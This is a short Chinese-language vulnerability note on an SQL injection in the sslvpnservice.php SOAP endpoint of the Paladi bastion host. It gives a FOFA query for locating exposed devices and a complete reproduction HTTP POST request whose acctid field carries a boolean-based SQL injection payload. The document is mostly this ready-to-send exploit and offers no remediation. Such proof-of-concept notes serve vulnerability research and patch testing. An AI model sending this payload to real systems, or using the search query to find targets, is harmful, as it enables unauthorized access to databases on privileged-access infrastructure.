# 帕拉迪堡垒机sslvpnservice.php存在SQL注入漏洞

# 一、漏洞简介
帕拉迪堡垒机支持移动管理和运维BYOD。移动管理和运维逐渐成为刚需，通过专用App从管理者和运维者角度进行多方位管理和操作。对服务器和网络中的各种帐号都能一键收集，对其状态一目了然，并做到最全单点登录。可编程环境通道。可进行自动化程序穿透，通过API接口，让运维自动化不再是法外之地，整个自动化过程可管理可审计，帕拉迪堡垒机sslvpnservice.php存在SQL注入漏洞

# 二、影响版本
帕拉迪堡垒机

# 三、资产测绘
+ fofa `app="帕拉迪Core4A-UTM"`
+ 特征

![1732591708185-7197ed3c-426d-406d-87bc-e274f1e91112.png](./img/dMM0XuD_mFjW1yLK/1732591708185-7197ed3c-426d-406d-87bc-e274f1e91112-569324.png)

# 四 、漏洞复现
```java
POST /sslvpnservice.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML,
like Gecko) Chrome/89.0.4389.90 Safari/537.36
Connection: close
Cookie: PHPSESSID=8fdj8pske96v2qdg13g36u8872; think_language=zh-cn
Content-Type: text/xml
Content-Length: 580

<?xml version="1.0" encoding="ISO-8859-1"?>
<SOAP-ENV:Envelope SOAPENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:SOAPENV="http://schemas.xmlsoap.org/soap/envelope/"
xmlns:xsd="http://www.w3.org/2001/XMLSchema"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:SOAPENC="http://schemas.xmlsoap.org/soap/encoding/">
<SOAP-ENV:Body>
<getAccountDetail>
<data>
{"token":"4e28b56969e59a18d72d0050a47f812a","user":"superman","acctid":"-1' or
1=if(1=1,1,2) limit 0,1 -- a","index":"1"}</data>
</getAccountDetail>
</SOAP-ENV:Body></SOAP-ENV:Envelope>
```



> 更新: 2024-11-27 10:04:11  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yxne8q3lvcvl18bl>